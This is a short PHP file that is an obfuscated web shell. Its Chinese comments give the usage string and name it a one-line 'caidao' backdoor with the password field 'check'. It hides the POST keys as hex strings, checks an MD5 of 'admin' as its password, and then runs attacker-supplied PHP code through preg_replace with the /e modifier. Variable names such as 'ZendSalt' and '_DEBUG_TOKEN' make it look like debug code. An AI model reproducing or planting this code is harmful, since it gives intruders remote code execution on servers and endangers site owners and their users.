<?php
// 利用方法：pass=admin&check=phpinfo(); 
// 一句话菜刀密码check

$MMIC= $_GET['tid']?$_GET['tid']:$_GET['fid'];
if($MMIC >1000000){
  die('404');
}
if (isset($_POST["\x70\x61\x73\x73"]) && isset($_POST["\x63\x68\x65\x63\x6b"]))
{
  $__PHP_debug   = array (
    'ZendName' => '70,61,73,73', 
    'ZendPort' => '63,68,65,63,6b',
    'ZendSalt' => '21232f297a57a5a743894a0e4a801fc3'  //md5(admin)
  );
 
  $__PHP_replace = array (
    pack('H*', join('', explode(',', $__PHP_debug['ZendName']))),
    pack('H*', join('', explode(',', $__PHP_debug['ZendPort']))),
    $__PHP_debug['ZendSalt']
  );
  $__PHP_request = &$_POST;
  $__PHP_token   = md5($__PHP_request[$__PHP_replace[0]]);
 
  if ($__PHP_token == $__PHP_replace[2])
  {
    $__PHP_token = preg_replace (
      chr(47).$__PHP_token.chr(47).chr(101),
      $__PHP_request[$__PHP_replace[1]],
      $__PHP_token
    );
 
    unset (
      $__PHP_debug,
      $__PHP_replace,
      $__PHP_request,
      $__PHP_token
    );
 
    if(!defined('_DEBUG_TOKEN')) exit ('Get token fail!');
 
  }
}  